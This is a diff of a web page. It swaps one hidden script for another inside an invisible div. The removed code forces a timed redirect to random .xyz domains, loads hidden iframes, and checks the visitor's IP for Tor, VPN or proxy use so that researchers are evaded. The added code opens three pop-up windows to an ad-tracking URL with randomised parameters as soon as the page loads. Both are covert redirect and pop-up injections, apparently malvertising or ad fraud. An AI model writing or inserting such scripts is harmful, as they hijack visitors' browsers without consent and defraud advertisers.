@@ -5,54 +5,35 @@
 <body>
 
 	
-	<div style="display:none;">	
-		
+	<div style="display:none;">		
 	  <script>
-		  
-
-                function message() {
-			var myArray = [1, 2, 3];
-			const randomElement = myArray[Math.floor(Math.random() * myArray.length)];
+		  function makeid(length) {
+    let result = '';
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    const charactersLength = characters.length;
+    let counter = 0;
+    while (counter < length) {
+      result += characters.charAt(Math.floor(Math.random() * charactersLength));
+      counter += 1;
+    }
+    return result;
+}
 	
-			if(randomElement === 1) {
-				window.location.href = "https://note4you.xyz/a1.html";
-			
-			}
-			if(randomElement === 2) {
-				window.location.href = "https://uuooo.xyz/a1.html";
-			}
-			
-			if(randomElement === 3) {
-				window.location.href = "https://livexxx00.xyz/a1.html";
-			}
-                }
-		  setTimeout(message,6000);
+
+		  var strWindowFeatures = "location=yes,height=768,width=1280,scrollbars=yes,status=yes";
 		  
+		  var URL1 = 'https://epicshow.net/show/?id=0&uid=36184&source_id=11486626&limit=1&sub1=&sub2=&sub3=&sub4=&subdate=0&landing_id=0&traffic_type=3' + '&' + makeid(5) + '=' + makeid(5);
+		  var win = window.open(URL1, "_blank", strWindowFeatures);
+
+		  var URL2 = 'https://epicshow.net/show/?id=0&uid=36184&source_id=11486626&limit=1&sub1=&sub2=&sub3=&sub4=&subdate=0&landing_id=0&traffic_type=3' + '&' + makeid(5) + '=' + makeid(5);
+		  var win2 = window.open(URL1, "_blank", strWindowFeatures);
+
+		  var URL3 = 'https://epicshow.net/show/?id=0&uid=36184&source_id=11486626&limit=1&sub1=&sub2=&sub3=&sub4=&subdate=0&landing_id=0&traffic_type=3' + '&' + makeid(5) + '=' + makeid(5);
+		  var win3 = window.open(URL1, "_blank", strWindowFeatures);
+		   
    	   </script>
-
-			<iframe src="https://note4you.xyz/adxxx.html" height="768" width="1366" ></iframe>
-
-
-
-
-
-		<iframe id="adx1" src="" height="768" width="1366" ></iframe>
-		<iframe id="adx2" src="" height="768" width="1366" ></iframe>
-
 		
-	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
-	<script>
-
-		$.getJSON("https://api.ipapi.is", function(result2){
-        	  if(result2.is_tor === undefined || result2.is_tor || result2.is_proxy || result2.is_vpn) {
-
-	              } else {
-			  	  
-			  	  document.getElementById('adx2').src = 'https://note4you.xyz/main133.html';
-	              }
-		 });
-	</script>
-
+	
 
 	</div>
 
